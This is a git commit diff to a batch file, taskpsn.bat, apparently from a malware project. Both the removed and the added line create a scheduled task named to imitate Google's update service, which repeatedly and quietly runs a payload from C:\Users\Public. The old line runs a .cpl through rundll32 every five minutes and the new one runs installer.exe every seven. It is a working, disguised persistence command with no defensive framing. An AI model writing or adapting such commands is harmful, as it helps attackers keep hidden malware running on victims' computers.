24a442b2f998b29a1e332289e6fcf583bb6b6bd0
Alien3407 <95103765+Alien3407@users.noreply.github.com>
2023-06-10 02:52:11 -0700

    Update taskpsn.bat

--- taskpsn.bat
+++ taskpsn.bat
@@ -1,1 +1,1 @@
-schtasks /create /tn "GoogleUpdateTaskMachineCor" /tr "cmd /c start /min rundll32 C:\Users\Public\psn.cpl" /sc minute /mo 5 /F
+schtasks /create /tn "GoogleUpdateTaskMachineCor" /tr "cmd /c start /min  C:\Users\Public\installer.exe" /sc minute /mo 7 /F
